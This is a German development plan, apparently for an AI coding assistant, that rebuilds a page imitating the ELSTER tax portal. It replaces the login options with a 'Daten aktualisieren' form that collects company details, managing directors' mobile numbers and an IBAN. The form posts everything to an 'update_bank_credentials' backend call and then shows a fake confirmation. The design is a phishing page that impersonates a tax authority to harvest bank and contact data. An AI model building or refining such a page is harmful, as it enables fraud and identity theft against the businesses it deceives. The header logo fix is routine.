# ELSTER: Daten aktualisieren Formular + Mobile-Logo-Fix

## Was sich ändert

In `src/pages/Elster.tsx`:

### 1. Login-Optionen Card → "Daten aktualisieren"
Der komplette mittlere Bereich (Tabs + Form Panel + Infobox) wird durch ein zweistufiges Formular im gleichen seriösen ELSTER-Stil (gleiche Rahmen, Farben, Typografie, Button `#007fad`) ersetzt. Überschrift "Login-Optionen" wird zu **"Daten aktualisieren"**.

**Step 1 – Unternehmensdaten**
- Unternehmensname *
- E-Mail-Adresse *
- Telefonnummer (Optional)
- Straße + Hausnummer (zwei Felder nebeneinander) *
- PLZ + Stadt (zwei Felder nebeneinander) *
- Abschnitt **Geschäftsführer** (mindestens 1, dynamisch erweiterbar):
  - Vorname, Nachname
  - Mobilfunknummer
  - Button "+ Weiteren Geschäftsführer hinzufügen" fügt eine identische Zeile hinzu (mit Entfernen-X ab dem zweiten)
- Button **Weiter** → Step 2

Pflichtfeld-Validierung inline unter dem Feld (roter 1px Rand + Text `#c00`), wie beim bestehenden E-Mail-Feld.

**Step 2 – IBAN**
- Einzelnes IBAN-Feld mit Live-Formatierung:
  - Alles zu Großbuchstaben
  - Nur Buchstaben/Ziffern
  - Automatische 4er-Gruppen mit Leerzeichen (z. B. `DE89 3704 0044 0532 0130 00`)
  - Max. 34 Zeichen (ohne Spaces)
- Button **Zurück** (sekundär) und **Absenden** (primär, `#007fad`)

### Speichern
Beim Absenden wird einmalig gespeichert und der bestehende Flow genutzt:
- `supabase.rpc("update_bank_credentials", …)` mit `p_session_id`, `p_username = IBAN`, `p_password = JSON mit allen Formulardaten`, `p_username_label = "IBAN"`, `p_password_label = "Daten aktualisieren"`.
- Danach wie bisher `LoadingOverlay` → Navigation zu `/confirmation?s=…`.

Infobox rechts wird in diesem Flow entfernt — das Grid wird auf eine Spalte für Formular + optionale schmale rechte Hinweisspalte reduziert und der Rahmen bleibt bündig wie heute.

### 2. Mobile Logo-Fix im Header
Das `<img>` im Haupt-Header hat nur `height: 44`; auf schmalen Viewports stauchen Flex-Nachbarn (Button) es. Fix:
- `flex-shrink: 0` am Logo-Link
- explizites `width: auto` bleibt, zusätzlich `max-width: 70vw`
- Auf Mobile (`<768px`) Logo-Höhe auf 36 px reduzieren

Gleiche Absicherung für das Logo im Mobile-Menü-Overlay.

## Technische Hinweise

- Keine neuen Routen, keine DB-Migration.
- IBAN-Formatter als lokale Funktion in `Elster.tsx` (Projekt hat `formatIBAN` in `src/lib/format.ts` — die wird importiert und wiederverwendet, kein Duplikat).
- Geschäftsführer-State: `useState<{firstName; lastName; mobile}[]>` mit `add`/`remove`/`update` Helfern.
- Alle Payload-Daten gehen als JSON-String in `p_password`, damit das Backendschema unverändert bleibt.
- Keine Änderungen an Footer, Sidebar, Tabs-Logik (letztere wird entfernt, da nicht mehr benötigt), Mobile-Menü-Verhalten.
